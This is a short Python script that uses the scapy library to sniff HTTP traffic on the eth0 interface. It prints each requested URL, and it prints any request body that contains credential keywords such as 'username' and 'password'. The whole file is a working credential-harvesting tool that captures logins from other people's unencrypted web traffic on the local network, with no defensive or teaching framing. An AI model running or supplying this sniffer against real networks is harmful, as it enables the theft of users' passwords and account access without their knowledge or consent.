#!/usr/bin/python3

import scapy.all as scapy
from scapy.layers import http
from urllib.parse import unquote

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=packed_sniffed_packed)

def packed_sniffed_packed(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        print(f"[+] HTTP Request >>> http://{url}")
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode()
            load = unquote(load)
            keywords = ["username", "password", "login", "user", "pass", "uname"]
            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break

sniff("eth0")
